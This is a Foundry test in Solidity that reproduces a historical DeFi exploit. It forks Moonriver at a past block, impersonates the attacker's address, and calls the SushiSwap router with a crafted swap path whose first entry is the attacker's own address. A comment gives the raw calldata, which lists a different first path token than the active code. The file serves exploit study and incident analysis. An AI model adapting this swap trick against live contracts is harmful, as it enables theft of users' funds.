// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface SushiRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address attacker = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
    address sushiSwapRouter = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("moonriver", 1_442_490); //fork moonriver at block 1442490
            // https://moonriver.moonscan.io/tx/0x5a87c24d0665c8f67958099d1ad22e39a03aa08d47d00b7276b8d42294ee0591
    }

    function testExploit() public {
        cheats.startPrank(attacker);

        address[] memory path = new address[](2);
        path[0] = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
        path[1] = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;
        // sushiSwapRouter.call(hex"38ed173900000000000000000000000000000000000000000000006c6b935b8bbd400000000000000000000000000000000000000000000000000000d30870ab532ed0c500000000000000000000000000000000000000000000000000000000000000a00000000000000000000000008d3d13cac607b7297ff61a5e1e71072758af4d010000000000000000000000000000000000000000000000000000000061fe94f80000000000000000000000000000000000000000000000000000000000000002000000000000000000000000868892cccedbff0b028f3b3595205ea91b99376b000000000000000000000000639a647fbe20b6c8ac19e48e2de44ea792c62c5c");

        sushiSwapRouter.call(
            abi.encodeWithSignature(
                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                2_000_000_000_000_000_000_000, // amountIn
                15_206_528_022_953_775_301, // amountOutMin
                path, // path
                0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01, // to
                1_644_074_232 // deadline
            )
        );
    }
}
